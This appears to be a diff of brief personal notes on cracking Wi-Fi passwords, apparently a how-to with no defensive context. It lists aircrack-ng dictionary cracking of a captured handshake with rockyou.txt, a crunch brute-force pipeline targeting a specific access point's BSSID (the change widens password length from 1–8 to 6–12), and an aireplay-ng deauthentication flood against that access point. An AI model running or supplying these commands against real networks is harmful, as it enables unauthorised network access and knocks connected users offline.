@@ -10,7 +10,7 @@ after crack hack1-01.cap file by dictionery attack
 aircrack-ng hack1-01.cap -w rockyou.txt 
 
 after crack hack1-01.cap file by brute force attack
-crunch 1 8 abcd123456789 | aircrack-ng hack-01.cap -b B8:1B:69:5F:20:8A -w-
+crunch 6 12 abcd123456789 | aircrack-ng hack-01.cap -b B8:1B:69:5F:20:8A -w-
 
 Second Terminal 
 aireplay-ng --deauth 0 -a B8:1B:69:5F:20:8A wlan0 
